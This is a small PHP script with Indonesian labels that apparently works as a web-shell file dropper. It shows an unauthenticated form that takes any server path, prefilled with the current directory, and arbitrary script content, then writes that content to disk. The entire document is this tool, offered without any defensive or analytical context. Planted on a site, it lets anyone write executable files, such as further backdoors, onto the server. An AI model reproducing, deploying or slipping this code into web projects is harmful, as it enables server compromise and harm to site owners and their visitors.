<?php

if(isset($_POST['save']))
{
	$f=$_POST['file'];
	$ext=$_POST['ext'];
	$data=$_POST['data'];
	$file=$f.$ext;
	if(file_exists($file))
	{
	echo "<font color='red'>NAMA FILE SUDAH ADA</font>";
	}
	else
	{
	$fo = fopen($file,"w");
	fwrite($fo,$data);
	echo "FILE DATA BERHASIL DI BUAT<br><br>";
	}
}


?>
<br><br><center>
<form method="post">
PILIH LOKASI DIRECTORI DAN BUAT NAMA FILE<br>
<input type="text" style="width: 525px"value="<? echo getcwd(); ?>"name="file"/><br/><br>

 

MASUKAN SCRIPTNYA<br>
<textarea rows="10" cols="64" name="data">
<?php echo @$contents ; ?>
</textarea>
<br/><br>
<input type="submit" class="btn cta"value="BUAT" name="save"/>
</form></center>
